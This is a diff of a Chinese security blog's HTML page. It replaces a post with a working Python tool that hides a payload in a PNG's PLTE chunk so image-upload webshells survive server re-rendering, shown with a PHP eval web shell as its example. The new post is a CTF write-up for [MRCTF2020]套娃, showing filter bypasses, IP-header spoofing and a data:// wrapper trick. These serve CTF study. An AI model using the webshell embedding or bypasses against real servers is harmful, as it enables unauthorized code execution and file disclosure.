@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PNG-write-payload | Rock&#39;s blog</title>
-  <meta name="keywords" content=" image , png , python , code ">
-  <meta name="description" content="PNG-write-payload | Rock&#39;s blog">
+  <title>[MRCTF2020]套娃-wp | Rock&#39;s blog</title>
+  <meta name="keywords" content=" ctf , writeup , web , php ">
+  <meta name="description" content="[MRCTF2020]套娃-wp | Rock&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="1.low 通过python提取图像的最低有效位组合成图像，发现是二维码。   from PIL import Image  img = Image.open(&amp;quot;&#x2F;root&#x2F;Downloads&#x2F;low.bmp&amp;quot;) lsbImg = img.copy() pix = lsbImg.load()  width = img.width height = img.height  for">
 <meta name="keywords" content="ctf,writeup,xctf,misc">
@@ -332,9 +332,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-PNG-write-payload" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-MRCTF2020-套娃-wp" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">PNG-write-payload</h1>
+        <h1 class="article-title">[MRCTF2020]套娃-wp</h1>
     
     <div class="article-meta">
         
@@ -343,20 +343,20 @@
         
         <span class="tag">
             
-            <a class="color1">image</a>
+            <a class="color4">ctf</a>
             
-            <a class="color4">png</a>
+            <a class="color3">writeup</a>
             
-            <a class="color2">python</a>
+            <a class="color4">web</a>
             
-            <a class="color5">code</a>
+            <a class="color4">php</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title='更新时间: 2020-01-04 19:18:58'>2020-01-04 18:31</time>
+        创建时间:<time class="date" title='更新时间: 2021-05-16 22:40:37'>2021-05-16 22:40</time>
         
     </div>
     <div class="article-meta">
@@ -378,7 +378,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#在PNG图像中隐藏payload，绕过二次渲染"><span class="toc-text">在PNG图像中隐藏payload，绕过二次渲染</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-绕过原理"><span class="toc-text">1.绕过原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"><span class="toc-text">在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"><span class="toc-text">对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-程序实现"><span class="toc-text">2.程序实现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"><span class="toc-text">以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用方法："><span class="toc-text">使用方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#示例："><span class="toc-text">示例：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#具体实现代码："><span class="toc-text">具体实现代码：</span></a></li></ol></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MRCTF2020-套娃"><span class="toc-text">[MRCTF2020]套娃</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-查看网页源码"><span class="toc-text">1.查看网页源码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-secrettw-php"><span class="toc-text">2.secrettw.php</span></a></li></ol></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -394,73 +394,67 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="在PNG图像中隐藏payload，绕过二次渲染"><a href="#在PNG图像中隐藏payload，绕过二次渲染" class="headerlink" title="在PNG图像中隐藏payload，绕过二次渲染"></a>在PNG图像中隐藏payload，绕过二次渲染</h1><h2 id="1-绕过原理"><a href="#1-绕过原理" class="headerlink" title="1.绕过原理"></a>1.绕过原理</h2><h3 id="在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"><a href="#在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。" class="headerlink" title="在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。"></a>在上传含有木马的图像时常常会遇到服务端对上传的图像进行二次渲染。服务端会提取图像中信息，并重新合成一幅图像，所以简单地将木马附加到图像最后或者注释信息中是不能成功上传图片木马的。</h3><h3 id="对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"><a href="#对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。" class="headerlink" title="对于PNG图像，可以考虑把木马隐藏到PLTE数据区或是IDATA数据中。"></a>对于PNG图像，可以考虑把木马隐藏到<code>PLTE</code>数据区或是<code>IDATA</code>数据中。</h3><h2 id="2-程序实现"><a href="#2-程序实现" class="headerlink" title="2.程序实现"></a>2.程序实现</h2><h3 id="以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"><a href="#以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。" class="headerlink" title="以下的程序实现了将用户给定payload写入含PLTE数据区的PNG图像中。"></a>以下的程序实现了将用户给定payload写入含<code>PLTE</code>数据区的PNG图像中。</h3><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><ul>
-<li>-f 选择要嵌入payload的png图片</li>
-<li>-m PLTE 指定嵌入位置为<code>PLTE</code>数据区</li>
-<li>-p 输入要嵌入的payload,必须使用<code>&quot;</code>包围</li>
-</ul>
-<h4 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h4><pre><code>xxx.py -f 1.png -m PLTE -p &quot;&lt;?php @eval($_POST[&apos;id&apos;]);?&gt;&quot;</code></pre><h3 id="具体实现代码："><a href="#具体实现代码：" class="headerlink" title="具体实现代码："></a>具体实现代码：</h3><pre><code>#!/bin/python3
-import binascii
-import re
-import sys, getopt
+        <h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>题目链接：<a href="https://buuoj.cn/challenges#[MRCTF2020]%E5%A5%97%E5%A8%83" target="_blank" rel="noopener">[MRCTF2020]套娃</a></p>
+<h2 id="1-查看网页源码"><a href="#1-查看网页源码" class="headerlink" title="1.查看网页源码"></a>1.查看网页源码</h2><pre><code>$query = $_SERVER[&apos;QUERY_STRING&apos;];
 
-&apos;&apos;&apos; GET args &apos;&apos;&apos;
-args = sys.argv[1:]
-try:
-    opts, args = getopt.getopt(sys.argv[1:],&apos;f:m:p:&apos;)
-except getopt.GetoptError:
-    print(&quot;Usage: -f file -m PLTE -p \&quot;playload\&quot;&quot;)
-    sys.exit()
+ if( substr_count($query, &apos;_&apos;) !== 0 || substr_count($query, &apos;%5f&apos;) != 0 ){
+    die(&apos;Y0u are So cutE!&apos;);
+}
+ if($_GET[&apos;b_u_p_t&apos;] !== &apos;23333&apos; &amp;&amp; preg_match(&apos;/^23333$/&apos;, $_GET[&apos;b_u_p_t&apos;])){
+    echo &quot;you are going to the next ~&quot;;
+}</code></pre><p>给出了php源码</p>
+<p>第一个if考察<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是未经url解码的查询字符串，因此将<code>_</code>url编码后可绕过。（url编码大小写不敏感）</p>
+<p>第二个if考察<code>preg_match()</code>只能匹配单行字符串，会将换行符后的字符串忽略。</p>
+<pre><code>?b%5Fu%5Fp%5Ft=23333%0a</code></pre><h2 id="2-secrettw-php"><a href="#2-secrettw-php" class="headerlink" title="2.secrettw.php"></a>2.secrettw.php</h2><p>查看网页源码，发现jsfuck编码字符串，输入浏览器执行。提示<br><img src="images/2021-05-16-20-27-49.png" alt=""></p>
+<p>尝试POST方式提交Merak参数</p>
+<p>返回部分源码</p>
+<pre><code>&lt;?php 
+error_reporting(0);
+include &apos;takeip.php&apos;;
+ini_set(&apos;open_basedir&apos;,&apos;.&apos;);
+include &apos;flag.php&apos;;
 
-file_path = mode = payload = &quot;&quot;
-for opt, argv in opts:
-    if opt == &apos;-f&apos;:
-        file_path = argv
-    elif opt == &apos;-m&apos;:
-        if argv == &apos;PLTE&apos; or argv == &apos;IDAT&apos;:
-            mode = argv
-        else:
-            print(&quot;Mode ERROR!&quot;)
-            sys.exit()
-    elif opt == &apos;-p&apos;:
-        payload = argv
+if(isset($_POST[&apos;Merak&apos;])){
+    highlight_file(__FILE__);
+    die(); 
+} 
 
-if mode == &apos;PLTE&apos;:
-    &apos;&apos;&apos; PLTE payload &apos;&apos;&apos;
-    hex_payload = binascii.b2a_hex(payload.encode())
-    file_name = file_path.split(&apos;/&apos;)[-1]
-    png = open(file_path,&apos;rb&apos;)
-    image = png.read()
-    png.close()
-    hexstr = binascii.b2a_hex(image)
 
-    searchObj = re.search(&apos;504c5445(.*?)49444154&apos;, hexstr.decode())
-    if searchObj:
-        front_data = image[:searchObj.span()[0]//2]
-        last_data = image[searchObj.span()[1]//2 - 4:]
-        plte = &apos;504c5445&apos; + searchObj.group(1)
-        if len(plte[:-16]) &gt;= len(hex_payload):
-            _new_plte = plte[:8] + hex_payload.decode() + plte[len(hex_payload) + 8:-16]
+function change($v){ 
+    $v = base64_decode($v); 
+    $re = &apos;&apos;; 
+    for($i=0;$i&lt;strlen($v);$i++){ 
+        $re .= chr ( ord ($v[$i]) + $i*2 ); 
+    } 
+    return $re; 
+}
+echo &apos;Local access only!&apos;.&quot;&lt;br/&gt;&quot;;
+$ip = getIp();
+if($ip!=&apos;127.0.0.1&apos;)
+echo &quot;Sorry,you don&apos;t have permission!  Your ip is :&quot;.$ip;
+if($ip === &apos;127.0.0.1&apos; &amp;&amp; file_get_contents($_GET[&apos;2333&apos;]) === &apos;todat is a happy day&apos; ){
+echo &quot;Your REQUEST is:&quot;.change($_GET[&apos;file&apos;]);
+echo file_get_contents(change($_GET[&apos;file&apos;])); }
+?&gt;</code></pre><p>猜测<code>getIp()</code>可能通过<code>X-Forwarder-For</code>或<code>client-ip</code>头可以绕过。</p>
+<pre><code>在请求头部添加
+X-Forwarder-For: 127.0.0.1
+client-ip: 127.0.0.1</code></pre><p><code>file_get_contents($_GET[&#39;2333&#39;]) === &#39;todat is a happy day&#39; )</code>可由<code>data:\\</code>伪协议绕过</p>
+<pre><code>secrettw.php?2333=data://text/plain,todat+is+a+happy+day
+空格需要url编码</code></pre><p><img src="images/2021-05-16-20-44-43.png" alt=""></p>
+<p><code>change()</code>函数将传入的字符串进行base64解码然后进行简单加密。</p>
+<p>我们需要传入<code>flag.php</code>故需要先将<code>flag.php</code>逐字符进行加密，然后进行base64编码。</p>
+<pre><code>python解码脚本
 
-            &apos;&apos;&apos; new PLTE crc &apos;&apos;&apos;
-            crc = binascii.crc32(binascii.a2b_hex(_new_plte)) &amp; 0xffffffff
-            new_plte = _new_plte + hex(crc)[2:] + plte[-8:]
-            plte_data = binascii.a2b_hex(new_plte)
-            new_image_data = front_data + plte_data + last_data
+import base64
 
-            &apos;&apos;&apos; new png &apos;&apos;&apos;
-            try:
-                new_png = open(&quot;_&quot;+file_name,&apos;xb&apos;)
-                new_png.write(new_image_data)
-                new_png.close()
-            except IOError:
-                print(&quot;_%s already exists.&quot; % (file_name))
-                sys.exit()
-        else:
-            print(&quot;Playload too long!&quot;)
-            sys.exit()
-    else:
-        print(&quot;Image doesn&apos;t include PLTE.&quot;)</code></pre>
+cstr = &quot;flag.php&quot;
+tmp = &quot;&quot;
+for i in range(len(cstr)):
+    ch = chr(ord(cstr[i])- i*2)
+    tmp += ch
+print(base64.b64encode(tmp.encode()))</code></pre><p>最终请求参数：</p>
+<pre><code>http://6ad8a2e0-f0f7-49c9-8087-ac1021dbe1a2.node3.buuoj.cn/secrettw.php?2333=data://text/plain,todat+is+a+happy+day&amp;file=ZmpdYSZmXGI%3D</code></pre><p><img src="images/2021-05-16-20-58-45.png" alt=""></p>
+
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以邮件至 luo_xiao_hei_718@163.com </span>
     </div>
@@ -469,12 +463,12 @@ if mode == &apos;PLTE&apos;:
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>PNG-write-payload</p>
+    <p><span class="copy-title">文章标题:</span>[MRCTF2020]套娃-wp</p>
     
     <p><span class="copy-title">本文作者:</span><a  title="Rock">Rock</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-01-04, 18:31:01</p>
-    <p><span class="copy-title">最后更新:</span>2020-01-04, 19:18:58</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/2020/01/04/PNG-write-payload/" title="PNG-write-payload">https://rock718.github.io.git/2020/01/04/PNG-write-payload/</a>
+    <p><span class="copy-title">发布时间:</span>2021-05-16, 22:40:37</p>
+    <p><span class="copy-title">最后更新:</span>2021-05-16, 22:40:37</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2021/05/16/MRCTF2020-%E5%A5%97%E5%A8%83-wp/" title="[MRCTF2020]套娃-wp">https://rock718.github.io.git/2021/05/16/MRCTF2020-%E5%A5%97%E5%A8%83-wp/</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
